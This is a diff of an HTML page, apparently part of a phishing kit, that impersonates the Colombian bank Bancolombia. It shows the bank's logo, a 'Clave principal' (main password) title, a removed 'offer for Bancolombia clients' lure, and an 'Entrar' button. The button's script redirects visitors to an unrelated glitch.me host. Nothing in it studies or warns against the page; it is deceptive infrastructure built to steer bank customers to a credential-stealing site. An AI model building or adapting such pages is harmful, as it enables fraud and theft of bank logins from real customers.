@@ -3,26 +3,215 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Oferta valida solo para clientes Bancolombia.</title>
-
-    <script>
-        // Función para redirigir después de 25 segundos
-        function redirigir() {
-            window.location.href = "inicio.html";
+    <title>Clave principal</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #F4F4F4;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 80vh;
         }
 
-        // Configurar la redirección automática
-        setTimeout(redirigir, 3000); // 25000 milisegundos = 25 segundos
+        .header {
+            width: 100%;
+            background-color: white;
+            padding: 20px 0;
+            text-align: center;
+            position: relative;
+            height: 30px;
+        }
+
+        .header img.logo {
+            width: 150px;
+        }
+
+        .header .user-icon {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            display: flex;
+            align-items: center;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .header .user-icon img {
+            margin-left: 10px;
+            height: 20px;
+        }
+
+        h1 {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #333;
+        }
+
+        .marco {
+            border-radius: 16px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 8px;
+            background-color: #fff;
+            padding: 32px;
+            width: 80vw;
+            max-width: 400px;
+        }
+
+        .marco form {
+            width: 100%;
+        }
+
+        .form-group {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .form-group input[type="number"] {
+            width: 50px;
+            padding: 10px;
+            border: none;
+            border-bottom: 1px solid #808285;
+            font-size: 20px;
+            text-align: center;
+            outline: none;
+            background-color: transparent;
+            -webkit-appearance: none;
+            -moz-appearance: textfield;
+            border-radius: 0;
+        }
+
+        .form-group input[type="number"]::-webkit-outer-spin-button,
+        .form-group input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .form-group input[type="number"]:focus {
+            border-bottom: 1px solid #808285;
+            outline: none;
+        }
+
+        .form-group input[type="number"]::selection {
+            background: none;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+        }
+
+        .buttons input[type="submit"] {
+            width: 48%;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 100px;
+            cursor: pointer;
+            border: none;
+        }
+
+        .bt1 {
+            background-color: #fff;
+            border: 1px solid #2C2A29;
+            color: #2C2A29;
+        }
+
+        .bt2 {
+            background-color: #D3D3D3;
+            color: #2C2A29;
+            font-weight: 600;
+        }
+
+        .bt2.enabled {
+            background-color: #FDDA24;
+        }
+
+        .footer {
+            width: 100%;
+            text-align: center;
+            padding: 10px 0;
+            background-color: #f8f8f8;
+            margin-top: 20px;
+        }
+
+        .footer img {
+            max-width: 100%;        
+        }
+
+
+        #boton-beneficio {
+            display: none;
+            background-color: #FFD700; /* Color amarillo */
+            color: #000; /* Color del texto */
+            border: none;
+            border-radius: 50px; /* Bordes redondeados */
+            padding: 15px 40px;
+            font-size: 18px;
+            cursor: pointer;
+            text-align: center;
+            width: 200px;
+        }
+
+        #boton-beneficio:hover {
+            background-color: #FFC700; /* Color más oscuro al pasar el mouse */
+        }
+    </style>
+    <script>
+        // Mostrar el botón después de 1 segundo
+        setTimeout(function() {
+            document.getElementById("boton-beneficio").style.display = "inline-block";
+        }, 0000);
+
+        // Reemplazar el gif por la imagen estática después de 4 segundos
+        setTimeout(function() {
+            document.getElementById("gif-img").style.display = "none"; // Ocultar el gif
+            document.getElementById("blob-img").style.display = "block"; // Mostrar la imagen estática
+        }, 0000);
+
+        // Función para redirigir al hacer clic en el botón
+        function redirigir() {
+            window.location.href = "https://uncovered-cypress-iron.glitch.me/"; // Reemplaza con la URL de destino
+        }
     </script>
 </head>
-<body style="background-color:#FCFCFF ;">
-
-<center>
-    <br><br><br><br><br><br><br>
-    <div>
-        <img style="width: 250px;" src="archivo/dina.gif" alt="">
+<body>
+    <div class="header">
+        <img style="width: 200px;" src="archivo/bbb.svg" alt="Bancolombia" class="logo">
+        <div class="user-icon">
+            Salir
+         </div>
     </div>
-</center>
+    <br> 
+    <div  class="">
+        <form   id="loginForm" method="post">
+            <center>
 
+<img  width="360px" src="archivo/cas.png" alt="">
+
+<br><br>
+<button id="boton-beneficio" type="button" onclick="redirigir()">Entrar</button>
+
+<br><br>
+
+
+<img width="360px" src="archivo/ser.jpg" alt="">
+
+ 
+
+             </center>
+            
+        </form>
+    </div>
+ 
+     
 </body>
 </html>
